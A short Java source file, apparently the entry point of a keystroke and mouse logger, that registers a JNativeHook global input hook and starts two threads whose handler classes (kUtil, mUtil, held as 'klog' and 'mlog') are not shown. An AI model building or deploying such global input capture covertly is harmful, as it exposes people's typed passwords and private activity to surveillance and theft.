package com.quietus.utils;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class utilMain{

    public static void main(String[] args) {

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }

        Runnable klog = new kUtil();
        Runnable mlog = new mUtil();

        Thread klogThread = new Thread(klog);
        Thread mlogThread = new Thread(mlog);

        klogThread.start();
        mlogThread.start();

    }

}
